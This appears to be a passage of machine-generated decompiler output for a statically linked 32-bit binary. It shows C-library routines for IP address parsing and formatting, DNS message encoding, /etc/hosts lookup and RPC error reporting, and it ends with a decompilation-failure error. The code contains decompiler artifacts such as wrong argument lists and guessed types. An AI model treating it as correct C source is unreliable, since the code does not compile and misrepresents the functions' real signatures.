  char v20; // [esp+1Ch] [ebp-20h]@3

  v3 = a2;
  if ( a1 == 2 )
    return inet_pton4(a2, a3);
  if ( a1 == 10 )
  {
    v5 = (char *)memset(&v20, 0, 0x10u);
    v6 = v5;
    v18 = (unsigned int)(v5 + 16);
    if ( *a2 != 58 || (v3 = a2 + 1, a2[1] == 58) )
    {
      v19 = v3;
      v17 = 0;
LABEL_18:
      v8 = 0;
      v16 = 0;
      while ( 1 )
      {
        while ( 1 )
        {
          v10 = tolower(*v3);
          v11 = v10;
          if ( !v10 )
          {
            if ( v16 )
            {
              if ( (unsigned int)(v6 + 2) > v18 )
                goto LABEL_37;
              *v6 = BYTE1(v8);
              v6[1] = v8;
              v6 += 2;
            }
            goto LABEL_28;
          }
          v7 = strchr("0123456789abcdef", v10);
          ++v3;
          if ( !v7 )
            break;
          v8 = (v7 - (_DWORD)"0123456789abcdef") | 16 * v8;
          if ( v8 > 0xFFFF )
            goto LABEL_37;
          v16 = 1;
        }
        if ( v11 != 58 )
          break;
        if ( v16 )
        {
          if ( *v3 && (unsigned int)(v6 + 2) <= v18 )
          {
            *v6 = BYTE1(v8);
            v6[1] = v8;
            v6 += 2;
            v19 = v3;
            goto LABEL_18;
          }
          goto LABEL_37;
        }
        if ( v17 )
          goto LABEL_37;
        v17 = v6;
        v19 = v3;
      }
      if ( v11 != 46 )
        goto LABEL_37;
      if ( (unsigned int)(v6 + 4) > v18 )
        goto LABEL_37;
      v9 = inet_pton4(v19, v6);
      v6 += 4;
      if ( v9 <= 0 )
        goto LABEL_37;
LABEL_28:
      if ( v17 )
      {
        v12 = 1;
        v13 = v6 - v17;
        if ( v6 == (char *)v18 )
          goto LABEL_37;
        while ( v12 <= v13 )
        {
          v14 = (char *)(v18 - v12);
          v15 = &v17[v13 - v12++];
          *v14 = *v15;
          *v15 = 0;
        }
        v6 = (char *)v18;
      }
      if ( v6 == (char *)v18 )
      {
        memcpy(a3, &v20, 0x10u);
        return 1;
      }
    }
LABEL_37:
    result = 0;
  }
  else
  {
    *(_DWORD *)_errno_location() = 97;
    result = -1;
  }
  return result;
}

//----- (0805904C) --------------------------------------------------------
_BYTE *__usercall inet_ntop4@<eax>(int a1@<eax>, _BYTE *a2@<edx>, unsigned int a3@<ecx>)
{
  signed int v3; // ebp@1
  int v4; // ebx@1
  int v5; // edi@2
  unsigned __int16 v6; // dx@2
  char v7; // cl@2
  __int16 v8; // dx@3
  unsigned __int16 v9; // ax@6
  unsigned int v11; // [esp+Ch] [ebp-40h]@1
  _BYTE *v12; // [esp+10h] [ebp-3Ch]@1
  int v13; // [esp+14h] [ebp-38h]@1
  unsigned __int8 *v14; // [esp+18h] [ebp-34h]@2
  char v15; // [esp+2Ah] [ebp-22h]@8
  __int16 v16; // [esp+2Bh] [ebp-21h]@1
  int v17; // [esp+2Dh] [ebp-1Fh]@1
  int v18; // [esp+31h] [ebp-1Bh]@1
  int v19; // [esp+35h] [ebp-17h]@1
  __int16 v20; // [esp+39h] [ebp-13h]@1
  char v21; // [esp+3Bh] [ebp-11h]@1

  v3 = 0;
  v13 = a1;
  v16 = 0;
  v12 = a2;
  v11 = a3;
  v4 = 0;
  v17 = 0;
  v18 = 0;
  v19 = 0;
  v20 = 0;
  v21 = 0;
  while ( v3 <= 3 )
  {
    v14 = (unsigned __int8 *)(v3 + v13);
    v5 = v4;
    v6 = *(unsigned __int8 *)(v3 + v13);
    v7 = *(_BYTE *)(v3 + v13) / 0x64u;
    *((_BYTE *)&v16 + v4) = v7 + 48;
    if ( v7 == 0 )
    {
      v8 = (unsigned __int8)(v6 / 0xAu) % 0xAu + 48;
      *((_BYTE *)&v16 + v4) = v8;
      if ( (_BYTE)v8 != 48 )
        v5 = v4 + 1;
    }
    else
    {
      v5 = v4 + 2;
      *((_BYTE *)&v16 + v4 + 1) = (unsigned __int8)(v6 / 0xAu) % 0xAu + 48;
    }
    v4 = v5 + 2;
    ++v3;
    v9 = *v14;
    *((_BYTE *)&v16 + v5 + 1) = 46;
    *((_BYTE *)&v16 + v5) = v9 % 0xAu + 48;
  }
  *(&v15 + v4) = 0;
  if ( strlen((const char *)&v16) <= v11 )
    return strcpy(v12, (char *)&v16);
  *(_DWORD *)_errno_location() = 28;
  return 0;
}

//----- (08059154) --------------------------------------------------------
_BYTE *__usercall inet_ntop@<eax>(int a1@<ebx>, signed int a2@<ebp>, int a3, int a4, int a5, unsigned int a6)
{
  int v6; // edx@4
  signed int v7; // ecx@3
  int v8; // edx@5
  int v9; // eax@5
  signed int v10; // edx@7
  signed int v11; // edi@7
  int v12; // eax@7
  char *v13; // ebx@26
  int i; // esi@26
  _BYTE *v15; // eax@39
  char v17; // [esp+Eh] [ebp-5Eh]@26
  int v18[5]; // [esp+3Ch] [ebp-30h]@3
  int v19; // [esp+50h] [ebp-1Ch]@38

  if ( a3 == 2 )
    return inet_ntop4(a4, (_BYTE *)a5, a6);
  if ( a3 != 10 )
  {
    *(_DWORD *)_errno_location() = 97;
    return 0;
  }
  memset(v18, 0, 0x20u);
  v7 = 0;
  while ( v7 <= 15 )
  {
    a1 = v7 / 2;
    v8 = *(unsigned __int8 *)(a4 + v7 + 1);
    v9 = *(unsigned __int8 *)(a4 + v7) << 8;
    v7 += 2;
    v18[a1] = v8 | v9;
  }
  v10 = 0;
  v11 = -1;
  v12 = -1;
  while ( v10 <= 7 )
  {
    if ( v18[v10] )
    {
      if ( v12 != -1 )
      {
        if ( v11 == -1 || a1 > a2 )
        {
          a2 = a1;
          v11 = v12;
        }
        v12 = -1;
      }
    }
    else if ( v12 == -1 )
    {
      v12 = v10;
      a1 = 1;
    }
    else
    {
      ++a1;
    }
    ++v10;
  }
  if ( v12 != -1 && (v11 == -1 || a1 > a2) )
  {
    a2 = a1;
    v11 = v12;
  }
  if ( v11 != -1 && a2 <= 1 )
    v11 = -1;
  v13 = &v17;
  for ( i = 0; i <= 7; ++i )
  {
    if ( v11 == -1 || i < v11 || (v12 = v11 + a2, i >= v11 + a2) )
    {
      if ( i )
        *v13++ = 58;
      if ( i == 6 && !v11 && (a2 == 6 || a2 == 5 && v19 == 0xFFFF) )
      {
        v15 = inet_ntop4(a4 + 12, v13, 46 - (v13 - &v17));
        v6 = 0;
        if ( !v15 )
          return (_BYTE *)v6;
        v13 += strlen(v13);
        goto LABEL_45;
      }
      v12 = sprintf((int)v13, (const char *)&unk_805BEB7, v18[i], v12);
      v13 += v12;
    }
    else if ( i == v11 )
    {
      *v13++ = 58;
    }
  }
  if ( v11 == -1 )
    goto LABEL_47;
LABEL_45:
  if ( v11 + a2 == 8 )
    *v13++ = 58;
LABEL_47:
  *v13 = 0;
  if ( v13 + 1 - &v17 > a6 )
  {
    *(_DWORD *)_errno_location() = 28;
    return 0;
  }
  return strcpy((_BYTE *)a5, &v17);
}
// 8059154: using guessed type int var_30[5];

//----- (08059324) --------------------------------------------------------
signed int __cdecl _encode_header(int a1, _BYTE *a2, signed int a3)
{
  signed int result; // eax@1

  result = -1;
  if ( a3 > 11 )
  {
    *a2 = *(_BYTE *)(a1 + 1);
    a2[1] = *(_DWORD *)a1;
    a2[2] = (*(_DWORD *)(a1 + 20) != 0) | 8 * (*(_BYTE *)(a1 + 8) & 0xF) | (*(_DWORD *)(a1 + 12) >= 1u ? 4 : 0) | (*(_DWORD *)(a1 + 16) >= 1u ? 2 : 0) | (*(_DWORD *)(a1 + 4) >= 1u ? 0x80 : 0);
    a2[3] = *(_BYTE *)(a1 + 28) & 0xF | (*(_DWORD *)(a1 + 24) >= 1u ? 0x80 : 0);
    a2[4] = *(_BYTE *)(a1 + 33);
    a2[5] = *(_DWORD *)(a1 + 32);
    a2[6] = *(_BYTE *)(a1 + 37);
    a2[7] = *(_DWORD *)(a1 + 36);
    a2[8] = *(_BYTE *)(a1 + 41);
    a2[9] = *(_DWORD *)(a1 + 40);
    a2[10] = *(_BYTE *)(a1 + 45);
    a2[11] = *(_DWORD *)(a1 + 44);
    result = 12;
  }
  return result;
}

//----- (080593D8) --------------------------------------------------------
signed int __cdecl _decode_header(unsigned __int8 *a1, int *a2)
{
  unsigned __int8 *v2; // ecx@1

  v2 = a1;
  *a2 = a1[1] | (*a1 << 8);
  a2[1] = (unsigned int)(char)a1[2] >> 31;
  a2[2] = (a1[2] >> 3) & 0xF;
  a2[3] = ((unsigned int)a1[2] >> 2) & 1;
  a2[4] = ((unsigned int)a1[2] >> 1) & 1;
  a2[5] = a1[2] & 1;
  a2[6] = (unsigned int)(char)a1[3] >> 31;
  a2[7] = a1[3] & 0xF;
  a2[8] = v2[5] | (v2[4] << 8);
  a2[9] = v2[7] | (v2[6] << 8);
  a2[10] = v2[9] | (v2[8] << 8);
  a2[11] = a1[11] | (a1[10] << 8);
  return 12;
}

//----- (08059484) --------------------------------------------------------
int __cdecl _encode_question(int a1, int a2, int a3)
{
  int v3; // eax@1
  int v4; // ecx@1
  _BYTE *v5; // edx@4

  v3 = _encode_dotted(*(char **)a1, a2, a3);
  v4 = v3;
  if ( v3 >= 0 )
  {
    if ( a3 - v3 > 3 )
    {
      v5 = (_BYTE *)(a2 + v3);
      v4 = v3 + 4;
      *v5 = *(_BYTE *)(a1 + 5);
      v5[1] = *(_DWORD *)(a1 + 4);
      v5[2] = *(_BYTE *)(a1 + 9);
      v5[3] = *(_DWORD *)(a1 + 8);
    }
    else
    {
      v4 = -1;
    }
  }
  return v4;
}

//----- (080594D8) --------------------------------------------------------
int __cdecl _length_question(int a1, int a2)
{
  int result; // eax@1

  result = _length_dotted(a1, a2);
  if ( result >= 0 )
    result += 4;
  return result;
}

//----- (080594F8) --------------------------------------------------------
int __cdecl _decode_answer(int a1, int a2, int a3, char **a4)
{
  int v4; // eax@1
  int v5; // edi@1
  int v6; // esi@2
  unsigned __int8 *v7; // ebx@4
  int v8; // edx@4
  int v10; // [esp+4h] [ebp-118h]@2
  char v11; // [esp+Ch] [ebp-110h]@1

  v4 = _decode_dotted(a1, a2, (int)&v11, 0x100u);
  v5 = v4;
  if ( v4 >= 0 )
  {
    v10 = v4 + a2;
    v6 = a3 - (v4 + a2) - 10;
    if ( v6 >= 0 )
    {
      v7 = (unsigned __int8 *)(v10 + a1);
      *a4 = strdup((off_t)a4, &v11);
      a4[1] = (char *)(v7[1] | (*v7 << 8));
      a4[2] = (char *)(v7[3] | (v7[2] << 8));
      a4[3] = (char *)_byteswap_ulong(*(_DWORD *)(v10 + a1 + 4));
      v8 = v7[9] | (v7[8] << 8);
      a4[5] = (char *)(v10 + a1 + 10);
      a4[4] = (char *)v8;
      a4[6] = (char *)(v10 + 10);
      if ( v6 >= v8 )
        v5 += v8 + 10;
      else
        v5 = -1;
    }
    else
    {
      v5 = a3 - (v4 + a2) - 10;
    }
  }
  return v5;
}

//----- (080595F4) --------------------------------------------------------
int _open_etc_hosts()
{
  int result; // eax@1

  result = fopen("/etc/hosts", 134594012);
  if ( !result )
    result = fopen("/etc/config/hosts", 134594012);
  return result;
}

//----- (08059625) --------------------------------------------------------
signed int __cdecl _read_etc_hosts_r(unsigned int *a1, unsigned __int8 *a2, int a3, int a4, _DWORD *a5, int a6, unsigned int a7, _DWORD *a8, _DWORD *a9)
{
  int v9; // ebx@1
  unsigned int v10; // edx@1
  unsigned int v11; // eax@1
  unsigned int v12; // ebp@5
  int v13; // esi@11
  _DWORD *v14; // edx@17
  char **v15; // eax@17
  _BYTE *v16; // eax@22
  char *v17; // ecx@24
  signed int v18; // edi@24
  signed int v19; // esi@36
  char *v21; // [esp+0h] [ebp-2Ch]@15
  char **v22; // [esp+4h] [ebp-28h]@15
  char *v23; // [esp+8h] [ebp-24h]@15
  char **v24; // [esp+Ch] [ebp-20h]@15
  signed int v25; // [esp+10h] [ebp-1Ch]@16
  char *v26; // [esp+18h] [ebp-14h]@5

  v9 = a6;
  v10 = a7;
  v11 = -a6 & 3;
  if ( v11 )
  {
    if ( a7 < v11 )
      return 34;
    v9 = v11 + a6;
    v10 = a7 - v11;
  }
  if ( v10 <= 0x1F )
    return 34;
  v12 = v10 - 32;
  v26 = (char *)(v9 + 32);
  if ( a4 == 1 )
  {
    v21 = 0;
    v22 = 0;
    v23 = 0;
    v24 = 0;
    goto LABEL_21;
  }
  *a9 = -1;
  if ( v12 <= 3 || v10 - 36 <= 7 || v12 <= 0xF || v10 - 48 <= 7 )
    return 34;
  v12 = v10 - 44;
  if ( v10 - 56 < v10 - 44 )
  {
    v13 = v9 + 56;
    v12 = v10 - 56;
  }
  else
  {
    v13 = v9 + 44;
  }
  if ( v12 <= 0x4F )
    return 34;
  a1 = (unsigned int *)_open_etc_hosts();
  if ( !a1 )
  {
    *a8 = 0;
    return *(_DWORD *)_errno_location();
  }
  v21 = (char *)(v9 + 32);
  v22 = (char **)(v9 + 36);
  v23 = (char *)(v9 + 32);
  v24 = (char **)(v9 + 48);
  v26 = (char *)v13;
LABEL_21:
  *a9 = 1;
  v25 = 1;
  while ( fgets(v12, v26, v12, a1) )
  {
    v16 = (_BYTE *)strchr(v26, 35);
    if ( v16 )
      *v16 = 0;
    v17 = v26;
    v18 = 0;
LABEL_33:
    if ( *v17 )
    {
      while ( *v17 )
      {
        if ( !(*((_BYTE *)_ctype_b + 2 * *v17) & 0x20) )
        {
          if ( v18 <= 6 )
            *(_DWORD *)(v9 + 4 * v18++) = v17;
          while ( *v17 && !(*((_BYTE *)_ctype_b + 2 * *v17) & 0x20) )
            ++v17;
          goto LABEL_33;
        }
        *v17++ = 0;
      }
    }
    *(_DWORD *)(v9 + 4 * v18) = 0;
    if ( v18 > 1 )
    {
      if ( a4 == 1 )
        return v25;
      v19 = 1;
      if ( a4 == 2 )
      {
        if ( !strcoll(a2, *(unsigned __int8 **)v9) )
        {
LABEL_43:
          if ( a3 == 2 )
          {
            if ( inet_pton(2, *(char **)v9, v21) > 0 )
            {
              *v22 = v21;
              v22[1] = 0;
              v14 = a5;
              *a5 = *(_DWORD *)(v9 + 4);
              a5[2] = 2;
              a5[3] = 4;
              v15 = v22;
LABEL_19:
              v14[4] = v15;
              v14[1] = v9 + 8;
              *a8 = v14;
              v25 = 0;
              break;
            }
          }
          else if ( a3 == 10 && inet_pton(10, *(char **)v9, v23) > 0 )
          {
            *v24 = v23;
            v24[1] = 0;
            v14 = a5;
            *a5 = *(_DWORD *)(v9 + 4);
            a5[2] = 10;
            a5[3] = 16;
            v15 = v24;
            goto LABEL_19;
          }
          v25 = 2;
        }
      }
      else
      {
        while ( v19 < v18 )
        {
          if ( !strcasecmp(a2, *(unsigned __int8 **)(v9 + 4 * v19)) )
            goto LABEL_43;
          ++v19;
        }
      }
    }
  }
  if ( a4 != 1 )
    fclose((int)a1);
  return v25;
}
// 8061BE0: using guessed type void *_ctype_b;

//----- (080598FC) --------------------------------------------------------
int __cdecl _drand48_iterate(unsigned __int16 *a1, int a2)
{
  unsigned __int64 v2; // rax@3

  if ( !*(_WORD *)(a2 + 14) )
  {
    *(_DWORD *)(a2 + 16) = -554899859;
    *(_DWORD *)(a2 + 20) = 5;
    *(_WORD *)(a2 + 12) = 11;
    *(_WORD *)(a2 + 14) = 1;
  }
  v2 = __PAIR__(a1[2], *a1 | ((unsigned int)a1[1] << 16)) * *(_QWORD *)(a2 + 16) + *(unsigned __int16 *)(a2 + 12);
  *a1 = *a1 * *(_WORD *)(a2 + 16) + *(_WORD *)(a2 + 12);
  v2 >>= 16;
  a1[1] = v2;
  a1[2] = WORD1(v2);
  return 0;
}

//----- (080599A4) --------------------------------------------------------
int __cdecl tolower(int a1)
{
  int v1; // edx@1

  v1 = a1;
  if ( (unsigned int)(a1 + 128) <= 0x17F )
    v1 = *((signed __int16 *)_ctype_tolower + a1);
  return v1;
}
// 8061BE8: using guessed type void *_ctype_tolower;

//----- (080599C4) --------------------------------------------------------
int __cdecl perror(char *a1)
{
  char *v1; // eax@1
  char *v2; // edx@2

  v1 = a1;
  if ( !a1 || (v2 = ": ", !*a1) )
  {
    v1 = "";
    v2 = "";
  }
  return fprintf(stderr, "%s%s%m\n", v1, v2);
}

//----- (080599F8) --------------------------------------------------------
int fprintf(size_t len, void *arg4, ...)
{
  off_t v2; // ebp@0
  va_list va; // [esp+28h] [ebp+Ch]@1

  va_start(va, arg4);
  return vfprintf(v2, len, arg4, (int)va);
}
// 80599F8: erroneously detected ellipsis type has been ignored
// 80599F8: can not handle register arguments in vararg function, discarded them

//----- (08059A18) --------------------------------------------------------
int __cdecl strchr(char *a1, char a2)
{
  char *v2; // esi@1
  char v3; // al@2

  v2 = a1;
  while ( 1 )
  {
    v3 = *v2++;
    if ( v3 == a2 )
      break;
    if ( !v3 )
    {
      v2 = (char *)1;
      return (int)(v2 - 1);
    }
  }
  return (int)(v2 - 1);
}

//----- (08059A38) --------------------------------------------------------
const char *__cdecl clnt_sperrno(int a1)
{
  unsigned int i; // eax@1

  for ( i = 0; i <= 0x11; ++i )
  {
    if ( rpc_errlist[2 * i] == a1 )
      return (const char *)(dword_805C104[2 * i] + 134594976);
  }
  return "RPC: (unknown error code)";
}
// 805C100: using guessed type int rpc_errlist[];

//----- (08059A62) --------------------------------------------------------
void __usercall free_mem(unsigned __int32 a1@<ebp>, int a2@<edi>)
{
  _DWORD *v2; // eax@1

  v2 = _rpc_thread_variables(a1, a2);
  free(a1, (_DWORD *)v2[39]);
}

//----- (08059A7C) --------------------------------------------------------
signed int __usercall clnt_perrno@<eax>(off_t a1@<ebp>, int a2)
{
  size_t v2; // ebx@1
  char *v3; // eax@1

  v2 = stderr;
  v3 = (char *)clnt_sperrno(a2);
  return fputs(a1, v3, v2);
}

//----- (08059A9C) --------------------------------------------------------
int __usercall buf@<eax>(off_t a1@<ebp>, int a2@<edi>)
{
  _DWORD *v2; // ebx@1

  v2 = _rpc_thread_variables(a1, a2);
  if ( !v2[39] )
    v2[39] = malloc(a1, a2, 0x100u);
  return v2[39];
}

//----- (08059AD0) --------------------------------------------------------
int __usercall clnt_spcreateerror@<eax>(int a1@<ebx>, off_t a2@<ebp>, int a3@<edi>, int a4)
{
  int v4; // ebp@1
  void *v5; // edi@2
  char *v6; // ebx@2
  char *v7; // eax@2
  char *v8; // ebx@2
  char *v9; // ebx@4
  char *v10; // eax@4
  char *v11; // esi@5
  char v13; // [esp+1Ch] [ebp-410h]@5

  v4 = buf(a2, a3);
  if ( v4 )
  {
    v5 = _rpc_thread_createerr(v4, a3);
    v6 = (char *)(v4 + sprintf(v4, "%s: ", a4, a1));
    v7 = (char *)clnt_sperrno(*(_DWORD *)v5);
    strcpy(v6, v7);
    v8 = &v6[strlen(v6)];
    if ( *(_DWORD *)v5 == 12 )
    {
      strcpy(v8, " - ");
      v11 = &v8[strlen(v8)];
      _glibc_strerror_r(*((_DWORD *)v5 + 2), &v13, 0x400u);
      strcpy(v11, &v13);
      v8 = &v11[strlen(v11)];
    }
    else if ( *(_DWORD *)v5 == 14 )
    {
      strcpy(v8, " - ");
      v9 = &v8[strlen(v8)];
      v10 = (char *)clnt_sperrno(*((_DWORD *)v5 + 1));
      strcpy(v9, v10);
      v8 = &v9[strlen(v9)];
    }
    *v8 = 10;
    v8[1] = 0;
  }
  return v4;
}

//----- (08059BC2) --------------------------------------------------------
signed int __usercall clnt_pcreateerror@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3)
{
  size_t v3; // ebx@1
  char *v4; // eax@1

  v3 = stderr;
  v4 = (char *)clnt_spcreateerror(stderr, a1, a2, a3);
  return fputs(a1, v4, v3);
}

//----- (08059BE3) --------------------------------------------------------
int __usercall clnt_sperror@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3, int a4)
{
  int v4; // ebp@1
  int result; // eax@1
  char *v6; // ebx@2
  char *v7; // eax@2
  char *v8; // esi@2
  int v9; // ST10_4@3
  int v10; // eax@3
  char *v11; // edi@4
  unsigned int v12; // eax@5
  unsigned int v13; // eax@10
  const char *v14; // ebx@10
  char v15; // [esp+20h] [ebp-41Ch]@3
  int v16; // [esp+420h] [ebp-1Ch]@2
  unsigned int v17; // [esp+424h] [ebp-18h]@3
  int v18; // [esp+428h] [ebp-14h]@13

  v4 = buf(a1, a2);
  result = 0;
  if ( v4 )
  {
    (*(void (__cdecl **)(int, int *, _DWORD))(*(_DWORD *)(a3 + 4) + 8))(a3, &v16, 0);
    v6 = (char *)(v4 + sprintf(v4, "%s: ", a4));
    v7 = (char *)clnt_sperrno(v16);
    strcpy(v6, v7);
    v8 = &v6[strlen(v6)];
    switch ( v16 )
    {
      case 0:
      case 1:
      case 2:
      case 5:
      case 8:
      case 10:
      case 11:
      case 12:
      case 13:
      case 14:
      case 15:
      case 16:
      case 17:
        goto LABEL_16;
      case 3:
      case 4:
        v9 = v16;
        _glibc_strerror_r(v17, &v15, 0x400u);
        v10 = sprintf((int)v8, "; errno = %s", &v15, v9);
        goto LABEL_15;
      case 6:
      case 9:
        v10 = sprintf((int)v8, "; low version = %lu, high version = %lu", v17, v18);
        goto LABEL_15;
      case 7:
        v12 = 0;
        break;
      default:
        v10 = sprintf((int)v8, "; s1 = %lu, s2 = %lu", v17, v18);
LABEL_15:
        v8 += v10;
        goto LABEL_16;
    }
    while ( v12 <= 7 )
    {
      if ( auth_errlist[2 * v12] == v17 )
      {
        v11 = (char *)(dword_805BFE4[2 * v12] + 134594592);
        goto LABEL_10;
      }
      ++v12;
    }
    v11 = 0;
LABEL_10:
    strcpy(v8, "; why = ");
    v13 = strlen(v8);
    v14 = &v8[v13];
    if ( v11 )
    {
      strcpy(&v8[v13], v11);
      v8 = (char *)&v14[strlen(v14)];
    }
    else
    {
      v8 = (char *)&v14[sprintf((int)&v8[v13], "(unknown authentication error - %d)", v17, v8)];
    }
LABEL_16:
    *v8 = 10;
    v8[1] = 0;
    result = v4;
  }
  return result;
}
// 805BFE0: using guessed type int auth_errlist[];

//----- (08059D56) --------------------------------------------------------
signed int __usercall clnt_perror@<eax>(off_t a1@<ebp>, int a2@<edi>, int a3, int a4)
{
  size_t v4; // ebx@1
  char *v5; // eax@1

  v4 = stderr;
  v5 = (char *)clnt_sperror(a1, a2, a3, a4);
  return fputs(a1, v5, v4);
}

//----- (08059D80) --------------------------------------------------------
int __cdecl _encode_dotted(char *a1, int a2, int a3)
{
  int v3; // ebx@1
  char *i; // edi@1
  int v5; // eax@2
  int v6; // ebp@2
  unsigned int v7; // esi@3
  int v8; // ebx@7
  char *v9; // ST00_4@7

  v3 = 0;
  for ( i = a1; i && *i; i = (char *)(v6 + 1) )
  {
    v5 = strchr(i, 46);
    v6 = v5;
    if ( v5 )
      v7 = v5 - (_DWORD)i;
    else
      v7 = strlen(i);
    if ( !v7 || v7 >= a3 - v3 - 1 )
      return -1;
    *(_BYTE *)(a2 + v3) = v7;
    v8 = v3 + 1;
    v9 = (char *)(v8 + a2);
    v3 = v7 + v8;
    memcpy(v9, i, v7);
    if ( !v6 )
      break;
  }
  if ( a3 > 0 )
  {
    *(_BYTE *)(a2 + v3) = 0;
    return v3 + 1;
  }
  return -1;
}

//----- (08059E10) --------------------------------------------------------
int __cdecl _decode_dotted(int a1, int a2, int a3, unsigned int a4)
{
  int v4; // edx@1
  int v5; // ebp@2
  unsigned int v6; // ecx@2
  int v7; // esi@3
  unsigned int v8; // edi@4
  unsigned int v9; // ebx@10
  int v11; // [esp+4h] [ebp-18h]@5
  char v12; // [esp+Bh] [ebp-11h]@2

  v4 = a2;
  if ( !a1 )
    return -1;
  v5 = 0;
  v6 = 0;
  v12 = 1;
  while ( 1 )
  {
    v9 = *(unsigned __int8 *)(a1 + v4);
    if ( !*(_BYTE *)(a1 + v4) )
      break;
    v7 = v4 + 1;
    v5 -= ((unsigned __int8)v12 < 1u) - 1;
    if ( (v9 & 0xC0) == 192 )
    {
      v5 -= ((unsigned __int8)v12 < 1u) - 1;
      v8 = v6;
      v4 = *(unsigned __int8 *)(a1 + v7) | ((v9 & 0x3F) << 8);
      v12 = 0;
    }
    else
    {
      v11 = v6 + v9;
      v8 = v6 + v9 + 1;
      if ( v8 >= a4 )
        return -1;
      memcpy((char *)(v6 + a3), (char *)(v7 + a1), v9);
      v4 = v7 + v9;
      if ( v12 )
        v5 += v9;
      *(_BYTE *)(a3 + v11) = *(_BYTE *)(a1 + v4) >= 1u ? 0x2E : 0;
    }
    v6 = v8;
  }
  return v5 - (((unsigned __int8)v12 < 1u) - 1);
}

//----- (08059EE8) --------------------------------------------------------
int __cdecl _length_dotted(int a1, int a2)
{
  int result; // eax@1
  int v3; // ebx@3
  int i; // ecx@2
  int v5; // edx@6

  result = -1;
  if ( a1 )
  {
    for ( i = a2; ; i = v3 + v5 )
    {
      v5 = *(unsigned __int8 *)(a1 + i);
      v3 = i + 1;
      if ( !*(_BYTE *)(a1 + i) )
        break;
      if ( (v5 & 0xC0) == 192 )
      {
        v3 = i + 2;
        break;
      }
    }
    result = v3 - a2;
  }
  return result;
}

//----- (08059F30) --------------------------------------------------------
int _do_global_ctors_aux()
{
  void (**v0)(void); // ebx@1
  void (*v1)(void); // eax@1
  int v3; // [esp+0h] [ebp-8h]@0

  v0 = (void (**)(void))&off_805D36C;
  v1 = (void (*)(void))off_805D36C;
  if ( off_805D36C != (int (*)())-1 )
  {
    do
    {
      --v0;
      v1();
      v1 = *v0;
    }
    while ( *v0 != (void (*)(void))-1 );
  }
  return v3;
}
// 804D611: using guessed type int pthread_initialize(void);
// 805D36C: using guessed type int (*off_805D36C)();

//----- (08059F58) --------------------------------------------------------
int term_proc()
{
  return _do_global_dtors_aux();
}

#error "There were 3 decompilation failure(s) on 562 function(s)"
